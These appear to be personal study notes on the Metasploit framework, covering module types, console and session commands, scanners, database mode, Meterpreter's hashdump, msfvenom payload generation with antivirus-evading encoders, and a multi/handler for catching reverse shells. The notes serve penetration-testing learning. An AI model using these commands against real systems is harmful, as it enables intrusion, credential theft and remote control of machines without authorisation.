# General
Mesploit runs in memory and therefore has no executable on the disk.
Most Antivirus will still detect it, eventhough it is fairly stealthy.

<details>
<summary>
  
# Framework Organisation  
</summary>

**Modules** \
The modules are located at /opt/metasploit-framework/embedded/framework/modules

**Auxiliary:**
- Scanners
- crawlers
- fuzzers

**Encoders:** 
- Encode exploit and payload to trick signature-based antivirus

**Evasion:**
- Direct evasion attempts of antivirus software

**Exploits**
- Neatly organised by target

**NOP's**
- No operations, used as buffers to achive consisten payload size

**Payloads**
- Adapters: Conver payloads into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
- Singles: Self-contained Payloads(add user, lauch calc.exe).
- Stagers: Form a connection to metasploit to download additional payloads(stages).
- Stages: Are loaded by the stager. Allows to use larger payload size.

**Post**
- Post-exploitation
</details>

# Basic Commands
`msfconsole` - Start metasploit console:  \
`help <command>` - Help  \
`history` - Show command history:  \
`show` - List modules and alike. Use `show -h` to see what can be showed \
`info <module>` - Show information about module  \
`search <what you want>` - Search \
`exit` - close metasploit

You can use many normal linux commands like in a linux terminal: `ls, cat, clear, ...`

# Contexts:
`use <context, e.g. exploit>` - Entering a context  \
`back` - Exit context:  \
`info` - Info about context:  \
`show options` - List all available options(parameters)  \
`set <parameter> <value>` - Sets `<parameter>` to `<value>` \
`unset <parameter>` \
`unset all` - Unsets all parameters in the current context \
`setg` - Set parameter to default value across all contexts until you exit metasploit \
`unsetg` \
`exploit` - Run the exploit, use `-z` to run in background \
`check` - Check if target is vulnerable without exploiting. Not supported by all modules.

## Exploits
`show payloads` - show available payloads for the exploit

## Sessions:
Once a vulnerabilitay has successfully been exploited, a session is started.

`exploit -j` - launches the module as job in the background \
`background` - Sends the session to the background and presents the context prompt again \
`CTRL + Z` - Same as Background \
`sessions` - List sessions \
`sessions -i <session-number>` - Interact with the session

## Scanning
There are many many scanners use `search scanner <what_you_need>`
### UDP
**udp_sweep** \
`run` 

### SMB
**smb_enumshares** \
**smb_version**

# Database mode
`systemctl start postgresql` \
`msfdb init` \
`mfsconsole` \
`db_status` 

## Workspaces
`workspace -a` - add new workspace \
`-d` - delete \
`-h` - lists options \
`help` - lists the db backend commands \
`db_nmap` - runs nmap but stores results in db \

# Meterpeter
`help` - show commands \
`hashdump` - prints ntlm password hashes for all users it can find

# Msfvenom
msfvenom replaced msfpayload and msfencode and allows you to generate payloads. \
`msfvenom -p <payload> <options>` - general syntax \
`msfvenom -p <OS/arch/shell/type> -f <format> -o <file_name> -e <encode_format> LHOST=<ip> LPORT=<port>` - example \
`-e <encode format>` - encode a payload. There are a variety of encoders available \
`-p <payload>` - select the payload \
`-f <format>` - output format. E.g. elf, raw, base64, exe, php, py, asp, ... \
`-o` - output file \
`LHOST=<ip>` - local ip \
`LPORT=<port>` - local port

## Staged vs Stageless payloads
`shell_<type>` - stageless \
`shell/<type>` - stages

## Handler
A handler catches an incomming connection from a payload (like a reverse shell) \
`use exploit/multi/handler` - can be used to catch incoming connections. Don't forget to set LHOST and LPORT. \




